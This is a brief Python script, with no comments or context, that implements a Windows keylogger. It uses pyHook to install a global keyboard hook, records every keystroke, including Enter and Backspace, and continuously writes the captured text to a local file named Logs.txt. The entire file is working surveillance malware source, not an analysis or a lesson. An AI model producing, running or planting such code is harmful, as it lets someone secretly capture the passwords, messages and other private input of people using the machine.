import pythoncom, pyHook

def keypressed(event):

    global store

    if event.Ascii == 13:
        keys = '< ENTER >'

    elif event.Ascii == 8:
        keys = '<BACK SPACE>'

    else:
        keys = chr(event.Ascii)

    store = store + keys

    fp=open("Logs.txt","w")
    fp.write(store)
    fp.close()

    return True

store = ''

obj = pyHook.HookManager()
obj.KeyDown = keypressed

obj.HookKeyboard()
pythoncom.PumpMessages()
